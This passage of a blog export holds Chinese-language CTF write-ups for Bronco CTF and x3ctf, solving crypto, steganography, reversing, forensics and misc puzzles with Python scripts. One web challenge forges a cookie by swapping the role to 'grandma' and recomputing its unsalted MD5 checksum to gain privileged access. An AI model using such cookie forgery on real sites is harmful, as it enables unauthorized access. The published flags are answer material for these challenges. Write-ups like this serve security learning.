socket.socket没有的remote有，socket.socket没有的remote也有。","categories":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/categories/CTF/"},{"name":"CTF小知识","slug":"CTF/CTF小知识","permalink":"http://example.com/categories/CTF/CTF%E5%B0%8F%E7%9F%A5%E8%AF%86/"}],"tags":[{"name":"socket,remote","slug":"socket-remote","permalink":"http://example.com/tags/socket-remote/"}]},{"title":"Bronco CTF Write Up","slug":"Writeup/Bronco-CTF-Write-Up","date":"2025-03-10T12:28:52.000Z","updated":"2025-03-11T10:35:37.176Z","comments":true,"path":"2025/03/10/Writeup/Bronco-CTF-Write-Up/","permalink":"http://example.com/2025/03/10/Writeup/Bronco-CTF-Write-Up/","excerpt":"Bronco CTF比赛的题解，涉及方向：Crypto, Web, Reverse, Steg, Misc, Forensics","text":"BeginnerBreak the Battalion 这道题我们会拿到一份ELF文件，我们用IDA打开它会看到 可以发现，这个程序的核心内容是encrypt，所以我们查看一下它的内容： 写一段python便可以简单得知输入什么内容最后会输出“brigade”： 12345678def decrypt(encrypted): return &#x27;&#x27;.join(chr(ord(c) ^ 0x50) for c in encrypted)encrypted = &quot;brigade&quot;original_input = decrypt(encrypted)print(f&quot;Original input: &#123;original_input&#125;&quot;)# Original input: 2&quot;97145 所以flag为： 1bronco&#123;2&quot;97145&#125; (吐槽一下，这个flag的内容真的非常奇怪，一般都是会带点正常单词的。) Simon Says 这道题我们会拿到这样一张图片： 并没有任何有用的内容。根据题目描述我们猜测这道题用了LSB隐写，所以用Stegsolve打开图片便可得到： flag为： 1bronco&#123;simon_says_submit_this_flag&#125; Too Many Emojis这道题我们会得到一串emoji内容： 因为知道flag的格式为bronco{}，所以可以确定这个应该是单表加密，并且知道前6个emoji对应的明文。 经过一系列搜索与排查可以发现每一个emoji对应的字母为这个emoji的官方英文名的首字母，根据这个线索我们可以通过找到的这些信息来解密内容： （用到的网站：https://unicode.org/emoji/charts/full-emoji-list.html） 这里有一个小技巧：如果找不到想要的 emoji，可以描述给 ChatGPT 并询问其官方名称，再到网站上用名称（或部分名称）搜索，确认是否是我们需要的。 最后得到flag： 1bronco&#123;emojis_express_my_emotions&#125; Straight Up Circular 这道题给出的加密字符串如下： 1dvlby_otspnr&#123;cobrnot450i1nm_e03&#125; 首先，通过 &#123;&#125; 的位置，我们可以判断这并不是替换加密。其次，我们发现 bronco&#123;&#125;（该比赛的 flag 统一格式）中的每个字母和符号都出现在了这串字符串中，因此很可能是某种乱序加密。 先确定 b、r、o 等字母在加密字符串中的具体位置，再根据题目名字（Straight Up Circular）不难发现这个用这个规律可以得到的flag开头： 从字符串正中间的 b 出发 先向右移动 1 位 再向左移动 2 位 接着向右移动 3 位 依此类推…… 继续这个流程便可以成功获得flag： 1bronco&#123;tr4n5p0sit1on_my_bel0v3d&#125; CryptoAcross the Tracks 我们会得到一段内容： 1Samddre··ath·dhf@_oesoere·ebun·yhot·no··oso·i·a·lr1rcm·iS·aruf·toibadhn·nadpikudynea&#123;l_oeee·ch·oide·f·n·aoe·sae·aonbdhgo_so·rr.i·tYnl·s·tdot·xs·hdtyy&#x27;·.t·cfrlca·epeo·iufiyi.t·yaaf·.a.·ts··tn33&#125;i·tvhr·.tooho···rlmwuI·h·e·iHshonppsoleaseecrtudIdet.·n·BtIpdheiorcihr·or·ovl·c··i·acn·t·su··ootr·:b3cesslyedheIath·e·_ 根据题目描述我们猜测这段内容使用了栅栏密码，并且key为题目描述中提到的“tenth”（10）。解密即可得到flag： 1bronco&#123;r@1l_f3nc3_cip3rs_r_cool&#125; Rahhh-SA 这道题我们会得到以下内容： 1234e = 65537n = 3429719c = [-53102, -3390264, -2864697, -3111409, -2002688, -2864697, -1695722, -1957072, -1821648, -1268305, -3362005, -712024, -1957072, -1821648, -1268305, -732380, -2002688, -967579, -271768, -3390264, -712024, -1821648, -3069724, -732380, -892709, -271768, -732380, -2062187, -271768, -292609, -1599740, -732380, -1268305, -712024, -271768, -1957072, -1821648, -3418677, -732380, -2002688, -1821648, -3069724, -271768, -3390264, -1847282, -2267004, -3362005, -1764589, -293906, -1607693]p = -811 首先注意到c的所有内容都是负数，但是其绝对值都小于等于n，所有猜测将其直接放进 $\\mathbb{Z}&#x2F;n\\mathbb{Z}$ 进行计算即可。但因为发现$p’ :&#x3D; n+p &#x3D; 3,428,908$ 并不是n的因数，所以尝试 $3429719&#x2F;811&#x3D;4229$ ，发现结果为整数。 所以写一段python代码来尝试RSA解码即可： 1234567891011121314151617181920212223242526272829303132333435363738394041#!/usr/bin/env python3e = 65537n = 3429719p = 811 # 题中写的是 -811，这里只取绝对值q = n // p # 4229# 计算 phi(n)phi = (p - 1) * (q - 1) # (811 - 1)*(4229 - 1) = 810*4228 = 3424680# 求 d = e^-1 mod phi(n)# Python 3.8+ 可以直接用 pow(e, -1, phi) 得到模逆d = pow(e, -1, phi)# 给出的负数密文c_list = [ -53102, -3390264, -2864697, -3111409, -2002688, -2864697, -1695722, -1957072, -1821648, -1268305, -3362005, -712024, -1957072, -1821648, -1268305, -732380, -2002688, -967579, -271768, -3390264, -712024, -1821648, -3069724, -732380, -892709, -271768, -732380, -2062187, -271768, -292609, -1599740, -732380, -1268305, -712024, -271768, -1957072, -1821648, -3418677, -732380, -2002688, -1821648, -3069724, -271768, -3390264, -1847282, -2267004, -3362005, -1764589, -293906, -1607693]# 解密plaintext_nums = []for c in c_list: # 先把负数转为 mod n 内的非负代表元 c_mod = c % n m = pow(c_mod, d, n) plaintext_nums.append(m)message = &#x27;&#x27;.join(chr(m) for m in plaintext_nums)print(&quot;解密后得到的数值:&quot;, plaintext_nums)print(&quot;尝试映射到字符后的结果:&quot;)print(message)# bronco&#123;m4th3m4t1c5_r34l1y_1s_qu1t3_m4g1c4l_raAhH!&#125; WebGrandma’s Secret Recipe （因为这份食谱离婚了实在是有点抽象） 点击网站可以看到： 点开Cookie可以发现有2条内容： 12checksum: a223befb6660a23f9c3491f74ef84e43role: &quot;kitchen helper&quot; 结果检查发现checksum为role的md5结果： 所以我们将role改为：”grandma”，并且将checksum改为a5d19cdd5fd1a8f664c0ee2b5e293167（&#x3D;md5(grandma))。点击“Grandma’s Pantry“便可以看到： 得到flag： 1bronco&#123;grandma-makes-b3tter-cookies-than-girl-scouts-and-i-w1ll-fight-you-over-th@t-fact&#125; ReverseReversing for Ophidiophiles 这道题我们会得到以下内容： 123a326c27bee9b40885df97007aa4dbe410e93 1234567891011121314flag = input()carry = 0key = &quot;Awesome!&quot;output = []for i,c in enumerate(flag): val = ord(c) val += carry val %= 256 val ^= ord(key[i % len(key)]) output.append(val) carry += ord(c) carry %= 256print(bytes(output).hex()) 直接用python写一段逆向的算法便可以得到flag： 123456789101112131415encrypted_hex = &quot;23a326c27bee9b40885df97007aa4dbe410e93&quot;encrypted_bytes = bytes.fromhex(encrypted_hex)carry = 0key = &quot;Awesome!&quot;flag = []for i, val in enumerate(encrypted_bytes): val ^= ord(key[i % len(key)]) # 逆向 XOR 操作 val = (val - carry + 256) % 256 # 逆向 carry 计算 flag.append(chr(val)) carry = (carry + val) % 256 # 重新计算 carry 值print(&quot;&quot;.join(flag))# bronco&#123;charge_away&#125; theflagishere! 这道题我们会得到一份Python 编译后的字节码文件 “theflagishere.pyc”，我们首先用这个网站将其反汇编： https://www.lddgo.net/string/pyc-compile-decompile 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129# Visit https://www.lddgo.net/string/pyc-compile-decompile for more information# Version : Python 3.9def what_do_i_do(whoKnows): a_st = &#123; &#125; for a in whoKnows: if a_st.get(a) == None: a_st[a] = 1 continue a_st[a] += 1 variable_name = 0 not_a_variable_name = &#x27;None&#x27; for a in a_st: if a_st[a] &gt; variable_name: not_a_variable_name = a variable_name = a_st[a] continue return (not_a_variable_name, variable_name)def char_3(): return &#x27;m&#x27;def i_definitely_return_the_flag(): def notReal(): def actually_real(): return &#x27;actuallyaflag&#x27; return actually_real def realFlag(): return &#x27;xXx___this__is_the__flag___xXx&#x27; return (realFlag, notReal)def i_am_a_function_maybe(param): variableName = (param + 102) * 47 for i in range(0, 100): variableName *= i + 1 variableName /= i + 1 newVariable = variableName * i newVariable += 100 return chr(ord(chr(int(variableName) + 1)))def i_do_not_know(): realFlagHere = &#x27;br0nc0s3c_fl4g5_4r3_345y&#x27; return &#x27;long_live_long_flags&#x27;def unrelated_statement(): return &#x27;eggs_go_great_with_eggs&#x27;def i_am_a_function(param): variableName = (param + 102) * 47 for i in range(0, 100): variableName *= i + 1 newVariable = variableName * i newVariable += 100 variableName /= i + 1 return chr(ord(chr(int(variableName))))def i_return_a_helpful_function(): def i_do_something(char): var = [] for i in range(54, 2000): var.append(ord(char) / 47 - 102) var.reverse() return var.pop() return i_do_somethingdef i_return_the_flag(): return &#x27;thisisdefinitelytheflag!&#x27;def i(): return &#x27;free_flag_f&#x27;def char_0(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(i_return_the_flag())[0]))def char_1_4_6(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(i_definitely_return_the_flag()[0]())[0]))def char_2_5_9(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(i_definitely_return_the_flag()[1]()())[0]))def char_7(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(interesting()()()()())[0]))def char_8(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(i_do_not_know())[0]))def char_10(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(unrelated_statement())[0]))def interesting(): def notinteresting(): def veryuninteresting(): def interesting_call(): return i return interesting_call return veryuninteresting return notinteresting 然后用python写一段逆向的脚本即可得到flag （主要内容其实就是复制粘贴）： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105def what_do_i_do(whoKnows): a_st = &#123;&#125; for a in whoKnows: if a_st.get(a) is None: a_st[a] = 1 continue a_st[a] += 1 variable_name = 0 not_a_variable_name = &#x27;None&#x27; for a in a_st: if a_st[a] &gt; variable_name: not_a_variable_name = a variable_name = a_st[a] return (not_a_variable_name, variable_name)def i_definitely_return_the_flag(): def notReal(): def actually_real(): return &#x27;actuallyaflag&#x27; return actually_real def realFlag(): return &#x27;xXx___this__is_the__flag___xXx&#x27; return (realFlag, notReal)def i_do_not_know(): realFlagHere = &#x27;br0nc0s3c_fl4g5_4r3_345y&#x27; return &#x27;long_live_long_flags&#x27;def unrelated_statement(): return &#x27;eggs_go_great_with_eggs&#x27;def interesting(): def notinteresting(): def veryuninteresting(): def interesting_call(): return i return interesting_call return veryuninteresting return notinterestingdef i(): return &#x27;free_flag_f&#x27;def i_return_a_helpful_function(): def i_do_something(char): var = [] for i in range(54, 2000): var.append(ord(char) / 47 - 102) var.reverse() return var.pop() return i_do_somethingdef i_am_a_function_maybe(param): variableName = (param + 102) * 47 for i in range(0, 100): variableName *= i + 1 variableName /= i + 1 newVariable = variableName * i newVariable += 100 return chr(ord(chr(int(variableName) + 1)))def char_0(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(i_return_the_flag())[0]))def char_1_4_6(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(i_definitely_return_the_flag()[0]())[0]))def char_2_5_9(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(i_definitely_return_the_flag()[1]()())[0]))def char_3(): return &#x27;m&#x27;def char_7(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(interesting()()()()())[0]))def char_8(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(i_do_not_know())[0]))def char_10(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(unrelated_statement())[0]))def i_return_the_flag(): return &#x27;thisisdefinitelytheflag!&#x27;# 拼接 flagflag = ( char_0() + char_1_4_6() + char_2_5_9() + char_3() + char_1_4_6() + char_2_5_9() + char_1_4_6() + char_7() + char_8() + char_2_5_9() + char_10())print(&quot;Recovered flag:&quot;, flag)# i_am_a_flag# bronco&#123;i_am_a_flag&#125; ForensicsQR Coded 这道题我们会得到一张二维码： 直接扫描（https://scanqr.org/）会得到一个fake flag： 用Stegsolve打开并调整到Gray bits会得到另外一张二维码： 扫描后会得到真正的flag： 1bronco&#123;th1s_0n3_i5&#125; Uno 这道题我们会得到这样一张图片： 根据题目描述（”a significant bit of the cards were left on the plane I was on.“）我们猜测这道题用的是LSB隐写了ASCII码，所以我们用StegSolve打开图片，利用其Data Extract模块进行查看。这个模块可以查看RGB三种颜色的每一个通道，并且按照（自选的）一定的排列顺序显示每个通道的Hex和ASCII码字符： 最后，根据题目描述中的 “the numbers really speak to me…” 这一句，尝试各种由 2、3、4、5 组成的组合，便可以得到 flag： 1bronco&#123;no_un0_y3t&#125; Wordlands 我们会得到这张图片： 经过一番尝试后，当用StegSolve打开图片，利用其Data Extract模块进行查看时可以发现： 8BPS是标准的Photoshop 的.psd 文件有固定的文件头，所以我们点击“Save Bin”将其存为wordlands.psd，并用这个网站打开它： https://www.photopea.com/ 可以发现这里有所有图片创作的信息（图层之类的）。最后根据line的图层的顺序进行拼接便可以得到flag： 比如说Shape1这个图层里的线连接了b和r，表示开头为br 然后是(b)ro，以此类推… 1bronco&#123;i_love_admiring_beautiful_winter_landscapes&#125; MiscTick Tock 这道题我们首先会得到这张图片： 经过多次尝试可以在StegSolve的Data Extract模块里发现有一长串由“tick”和“tock”组成的内容： 1ticktocktocktockticktickticktock ticktocktocktickticktocktocktock ticktocktocktickticktockticktick ticktocktockticktickticktocktock ticktocktocktocktickticktocktick ticktocktocktickticktockticktick ticktocktocktocktockticktocktock ticktocktocktockticktockticktock ticktocktocktocktocktickticktick ticktocktockticktockticktocktock ticktocktocktockticktockticktick ticktockticktocktocktocktocktock ticktocktockticktickticktocktick ticktocktocktocktocktickticktick ticktocktockticktickticktocktock ticktocktockticktockticktocktick ticktocktockticktocktickticktock ticktocktocktockticktockticktick ticktocktockticktocktickticktick ticktockticktocktocktocktocktock ticktocktockticktockticktocktick ticktocktockticktickticktocktock ticktocktockticktocktickticktock ticktocktocktocktocktickticktick ticktocktocktickticktickticktock ticktockticktocktocktocktocktock ticktocktockticktickticktocktick ticktocktocktocktocktickticktick ticktocktocktocktickticktocktock ticktocktockticktickticktocktock ticktocktocktocktocktickticktick ticktocktocktockticktocktocktick ticktocktocktockticktocktocktock ticktocktockticktocktickticktock ticktocktocktocktocktockticktock 写一段python将tick替换成0，tock替换成1然后当成二进制内容进行解码会得到： 1234567891011121314151617def ticktock_to_binary(text): return text.replace(&quot;tick&quot;, &quot;0&quot;).replace(&quot;tock&quot;, &quot;1&quot;)text = &quot;ticktocktocktockticktickticktock ticktocktocktickticktocktocktock ticktocktocktickticktockticktick ticktocktockticktickticktocktock ticktocktocktocktickticktocktick ticktocktocktickticktockticktick ticktocktocktocktockticktocktock ticktocktocktockticktockticktock ticktocktocktocktocktickticktick ticktocktockticktockticktocktock ticktocktocktockticktockticktick ticktockticktocktocktocktocktock ticktocktockticktickticktocktick ticktocktocktocktocktickticktick ticktocktockticktickticktocktock ticktocktockticktockticktocktick ticktocktockticktocktickticktock ticktocktocktockticktockticktick ticktocktockticktocktickticktick ticktockticktocktocktocktocktock ticktocktockticktockticktocktick ticktocktockticktickticktocktock ticktocktockticktocktickticktock ticktocktocktocktocktickticktick ticktocktocktickticktickticktock ticktockticktocktocktocktocktock ticktocktockticktickticktocktick ticktocktocktocktocktickticktick ticktocktocktocktickticktocktock ticktocktockticktickticktocktock ticktocktocktocktocktickticktick ticktocktocktockticktocktocktick ticktocktocktockticktocktocktock ticktocktockticktocktickticktock ticktocktocktocktocktockticktock&quot;text = text.replace(&quot; &quot;, &quot;&quot;)binary = ticktock_to_binary(text)print(binary)# 01110001 01100111 01100100 01100011 01110010 01100100 01111011 01110101 01111000 01101011 01110100 01011111 01100010 01111000 01100011 01101010 01101001 01110100 01101000 01011111 01101010 01100011 01101001 01111000 01100001 01011111 01100010 01111000 01110011 01100011 01111000 01110110 01110111 01101001 01111101content = &#x27;&#x27;.join(chr(int(binary[i:i+8], 2)) for i in range(0, len(binary), 8))print(content)# qgdcrd&#123;uxkt_bxcjith_jcixa_bxscxvwi&#125; 最后通过遍历凯撒密码便可以得到flag： 1bronco&#123;five_minutes_until_midnight&#125; 比赛官方GitHubhttps://github.com/SCUBroncoSec/BroncoCTF-2025-Public","categories":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/categories/CTF/"},{"name":"writeup","slug":"CTF/writeup","permalink":"http://example.com/categories/CTF/writeup/"}],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://example.com/tags/writeup/"}]},{"title":"X3ctf2025 Write Up","slug":"Writeup/X3ctf2025-Write-Up","date":"2025-03-10T12:25:08.000Z","updated":"2025-03-11T10:35:44.974Z","comments":true,"path":"2025/03/10/Writeup/X3ctf2025-Write-Up/","permalink":"http://example.com/2025/03/10/Writeup/X3ctf2025-Write-Up/","excerpt":"x3ctf比赛的题解，涉及方向：Misc, Crypto","text":"1. Miscp11n-trophy（签到题）:题目描述： 我们首先会得到这样一份证书： 第一题签到题的答案就是证书下面正中间的“This certificate does not grant the rank of Master”。 trophy-plus + trophy-plus64:这两道目描述一模一样 其中一个flag是藏在certificate周围一圈的位置： 人工将这些内容识别，再翻译成二进制然后解码就会得到flag 1234567891011121314151617181920212223242526272829303132def decode_binary(content, mapping): # Convert content to binary using the mapping binary_str = &#x27;&#x27;.join(mapping[char] for char in content if char in mapping) # Split the binary string into 8-bit chunks bytes_list = [binary_str[i:i+8] for i in range(0, len(binary_str), 8)] # Convert each 8-bit chunk to a character decoded_text = &#x27;&#x27;.join(chr(int(byte, 2)) for byte in bytes_list if len(byte) == 8) return decoded_text# Input stringc_1 = &quot;MVVVVMMMMMVVMMVVMVVMMMVVMVVVVMVVMVVM VMMV MV MVVVVVMVVMM VMM MMVVMMMV&quot;c_2 = &quot;MVVMM VMMMVVMVVVMMM VMMVVVMVVVMV MMM VMVVVVVMVVM VMVVMVVMVVVMMMVVMMMMMVVVMVVVM VMVVVVV&quot;c_3 = &quot;VMMMVVMMM VMMMVVMVVVVVM VMMV MMVVVMMMMMVVMMMVVMMVVMVVVVVM VMMM VMMVVMVVMMVVMMVVMMVVVM VMV MVVVMVVVVVM VM VM VMMVVMMV MMMVVMVVVVVMV MMMV MMVVMMMVVMVVM VMV MVVVMMMMMVVMMVVMMMVVMVVVVVM VMV MVVMVVMMVVMVVVM VMVVMVVM&quot;reversed_c_3 = c_3[::-1]c_4 = &quot;MMV MMVVMMMMMVVMMVVMMMVVMMVVVMVVMVVMMVVMMVVVVVM VMV MMVVVVMMV MMVVVMMM VMVVMMMVVVMVVM&quot;reversed_c_4 = c_4[::-1]c_5 = &quot;MMVVMMM VMVVMVVVMMVVMMVVVM VMVVVVVMVVMVVMMMMVVMMMMMVVMVVMMMVVVVVMV&quot;# mapping = &#123;&#x27;M&#x27;: &#x27;0&#x27;, &#x27;V&#x27;: &#x27;1&#x27;&#125;mapping1 = &#123;&#x27;M&#x27;: &#x27;1&#x27;, &#x27;V&#x27;: &#x27;0&#x27;&#125;mapping2 = &#123;&#x27;M&#x27;: &#x27;0&#x27;, &#x27;V&#x27;: &#x27;1&#x27;&#125;# print(decode_binary(c_1, mapping2)+decode_binary(c_2, mapping2) + decode_binary(c_3, mapping2) + decode_binary(c_4, mapping2) + decode_binary(c_5, mapping2) )print(decode_binary(c_1, mapping2)+decode_binary(c_2, mapping2) + decode_binary(reversed_c_3, mapping2) + decode_binary(reversed_c_4, mapping2) + decode_binary(c_5, mapping2) )# 输出结果：x3c&#123;i_d1dn&#x27;t_kn0w_mvm_c0uld_be_us3d_f0r_b1n4ry_3nc0d1ng_l0l&#125; 另外一个flag则是藏在右下角的勋章里： 人工将这些内容识别出来然后用base64进行解码即可。 内容大概为： 12345678910111213141516171819202122232425262728-----BEGIN CERTIFICATE-----MIIDyjCCAlCgAwIBAgISBKmF/S4TYSXpTzcor9eZJ/GrMAoGCCqGSM49BAMDMDIxCzAJBgNVBAYTAlVTMRYwFAYDVQQKEwlMZXQncyBFbmNyeXB0MQswOQYDVQQDEwJFNjAeFw0yNTAxMDYyMDM2MDFaFw0yNTA0MDYyMDM2MDBaMEAxPjA8BgNVBAMMNXgzY3ttdTV0X2IzX2Zlbl90eXAxbmdfdGgxcl9ieV9oNG5kXzEzNzUxMDUzMDQyNDgzNjF9MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEcYu3flnEI2dttI5lQQmzRld72SDdBqCDtfto9pg5t/NFFIolkY8W8CryM9XlJEx3NAOGTgBoeUNTuWgiCseQeaOCAjYwggIyMA4GA1UdDwEB/wQEAwIHgDAdBgNVHSUEFjAUBggrBgEFBQcDAQYIKwYBBQUHAwIwDAYDVR0TAQH/BAIwADAdBgNVRQ4EFgQUrbtyF28hjw8oIqwXpakw8t7J9jQwHwYDVR0jBBgwFoAUkydGmAOpUWiOmNbEQkjbI79YlNIwVQYIKwYBBQUHAQEESTBHMCEGCCsGAQUFBzABhhVodHRwOi8vZTYuby5sZW5jci5vcmcwIgYIKwYBBQUHMAKGFmh0dHA6Ly91Ni5pLmxlbmNyLm9yZy8wQAYDVR0RBDkwN4IleDNje2llNXRfYjNfZnVuX3R5cDFuZl90aDFzX2J5X2g0bmRfMTM3NTEwNTMwNDI0ODM2MX0wEwYDVR0gBAwwCjAIBgZngQwBAgEwggEDBgorBgEEAdZ5AgQCBIH0BIHxAO8AdQB9WR4S4XggexxhZ3xe/fjQhlw0oE6VnrkDL9kOjC55uAAAAZQ9inTEAAAEAwBGMEQCIENpWRg98SQo5JdzyjgnyFeUY0WnNVzn5NkdDA3bzeKbAiBsAkk3fe5esm7A0efsLN/EyFjEK/NBGqYxgOucgZheQwB2ABNK3xglmEIjeAxv70x6kaQWtyNJzlhXat+u2qfCq+AiAAAB1D2KdXoAAAQDAEcwRQIgBfU4pkiNyNsl+I6skjXz6qqu+mNoI4JvtDsoYxoI+ZoCIQCRiMQSCEwahN0ImXu3cwDeyM+AbNeve0VgSLMSUBdxvTAKBggghkjOPQQDAwNoADBlAjEAvxa6nSpUMl7NuDB/+LJfzTskR498vLoetnZuHo14J6d9zuFRGQ8Dk4w2aQNsbuVsAjB9fE6GJYBiebb4aHu/J2amych3KP//D951/CdmiV5PKZqXWWdpaQZL+pbmsXRa8rM=-----END CERTIFICATE----- 会有一些误差，所以最后提交flag时需要多试几次。 foundations （Osint）：题目描述： 使用https://archive.org/来搜索这个比赛网站的历史纪录内容 可以在这里发现最早的纪录是在2024年7月14日： 点进去会发现： x3CTF{m4yb3_w3ll_m4ke_4_ch4ll3nge_0u7_0f_7h1s} mvm： 打开下载文件会得到 12MMVMVMVVMMVMVMVVMVMVVMVVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVVVMMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVVMMMVMVVMVMVMVVMVVMMVMVVMVMMVVVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVVMVMMVMVVVMMMVMVMVVMVMVVMVVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVMVVMMVMVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVVVMMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVVMMMVMVVMVMVMVVMVVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVVVMMMVMVMVVMVMVVMVVMMVMVVMVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVMVVMMVMVMVVMMVMVVVMMMVVVVVMMMVMVVMVMVMVVMVVMMVMVVMVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVVMMMVMVVMVMMVMVVMVMVMVVMVVMMVMVVMVMMVVVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVMVVMMVMVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVVVMMVMVVMVVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVVVMMVMVVMVVMMVMVVMVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVVVMMMVMVVMVMVMVVMVVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVVVMMMVVVVVMMMVMVVMVMVMVVMVVMMVMVVMVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVVVMMMVMVVMVMVMVVMVVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVVMVMMVMVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVVVMMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVVMMMVMVVMVMMVMVVVMMMVMVMVVMMVMVMVVMVMVVMVVMMVMVVMVMMVVVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVMVVMMVMVVVMMVMVVMVVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVMVVMMVMVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVVVMMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVVMMMVVVVVMMMVMVVMVMMVMVVMVMVMVVMVVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVVVM 跟之前一样，将其转成二进制再解码会得到 1++[----------&gt;+&lt;]&gt;.+++++++++.---------.-[-&gt;+++++&lt;]&gt;-.+[-----&gt;+&lt;]&gt;+.+++++++++.---------.-[----&gt;+++++&lt;]&gt;.+[---&gt;++&lt;]&gt;++.&gt;-[---&gt;+&lt;]&gt;---.--[-&gt;++++&lt;]&gt;+.++++++++.+++++.[--&gt;+++++++++&lt;]&gt;.[---&gt;+++++&lt;]&gt;.++++++++++.++++++++++++.-[-----&gt;+&lt;]&gt;.&gt;-[---&gt;+&lt;]&gt;.-[-----&gt;+&lt;]&gt;-.++++++++.------.-.++[-&gt;+++++&lt;]&gt;+.[-----&gt;++++&lt;]&gt;+.+++++++++.---------.&gt;--[--&gt;+++&lt;]&gt;. 很显然这是Brainfuck,所以找个在线的intepreter运行一下就可以得到flag： MVM{MVM_BRAIN_IS_FUCKED_MVM} count-the-mvms主要是数背景的mvm个数，发现它们的像素点是一样的。所以写个图像匹配脚本即可. 首先要把pdf转换成 png，推荐 adobe acrobat 123456789101112131415161718192021222324252627282930313233343536import cvlib# cvlib 是自己写的库im = cvlib.read_img(&quot;certificate_h4tum.png&quot;)sim = cvlib.subrectimg(im, 605, 516, 837, 665)sim2 = cvlib.subrectimg(sim, 44, 32, 79, 48)mvm = cvlib.subrectimg(sim2, 2, 2, 32, 13)print(&quot;read success&quot;)def match(im, x,y): if x+len(mvm) &gt; len(im): return False if y+len(mvm[0]) &gt; 